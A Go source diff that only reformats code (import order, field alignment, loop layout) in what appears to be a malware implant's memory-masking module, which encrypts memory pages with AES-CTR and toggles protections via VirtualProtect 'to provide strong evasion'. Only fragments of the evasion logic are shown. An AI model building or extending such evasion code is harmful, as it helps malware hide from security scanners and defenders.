@@ -6,8 +6,8 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/sha256"
 	crand "crypto/rand"
+	"crypto/sha256"
 	"fmt"
 	"sync"
 	"unsafe"
@@ -17,16 +17,16 @@ import (
 // It combines AES-CTR page encryption with stack splicing
 // and SHA-256 integrity verification to provide strong evasion.
 type advancedMaskState struct {
-	mu               sync.Mutex
-	key              [32]byte
-	iv               [aes.BlockSize]byte
-	pages            []advPage
-	pageHashes       [][]byte
-	stackBase        uintptr
-	stackSize        uintptr
-	stackBuf         []byte
-	ready            bool
-	encrypted        bool
+	mu                sync.Mutex
+	key               [32]byte
+	iv                [aes.BlockSize]byte
+	pages             []advPage
+	pageHashes        [][]byte
+	stackBase         uintptr
+	stackSize         uintptr
+	stackBuf          []byte
+	ready             bool
+	encrypted         bool
 	integrityFailures int32
 }
 
@@ -191,7 +191,9 @@ func advEncryptPages(pages []advPage) {
 		tmp := make([]byte, len(buf))
 		copy(tmp, buf)
 		stream.XORKeyStream(buf, tmp)
-		for j := range tmp { tmp[j] = 0 }
+		for j := range tmp {
+			tmp[j] = 0
+		}
 
 		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
 	}
@@ -234,7 +236,9 @@ func advDecryptPages(pages []advPage) {
 		tmp := make([]byte, len(buf))
 		copy(tmp, buf)
 		stream.XORKeyStream(buf, tmp)
-		for j := range tmp { tmp[j] = 0 }
+		for j := range tmp {
+			tmp[j] = 0
+		}
 
 		procVirtualProtect.Call(p.base, p.size, uintptr(old), uintptr(unsafe.Pointer(&old)))
 	}
